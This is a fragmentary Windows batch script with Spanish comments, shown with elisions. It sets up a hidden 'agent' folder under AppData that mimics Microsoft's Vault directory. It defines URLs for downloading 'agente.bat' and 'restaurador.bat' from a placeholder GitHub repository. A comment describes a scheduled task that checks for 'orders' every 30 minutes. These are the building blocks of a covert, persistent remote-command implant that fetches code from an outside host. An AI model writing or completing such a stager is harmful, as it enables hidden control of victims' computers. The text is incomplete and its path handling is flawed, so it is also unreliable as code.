...
set "DIR_AGENTE=%AppData%\Roaming\Microsoft\Vault"
...
set "URL_AGENTE=https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/agente.bat"
set "URL_RESTAURADOR=https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/restaurador.bat"
...
:: Tarea 1: El Agente (Revisión de órdenes cada 30 minutos)
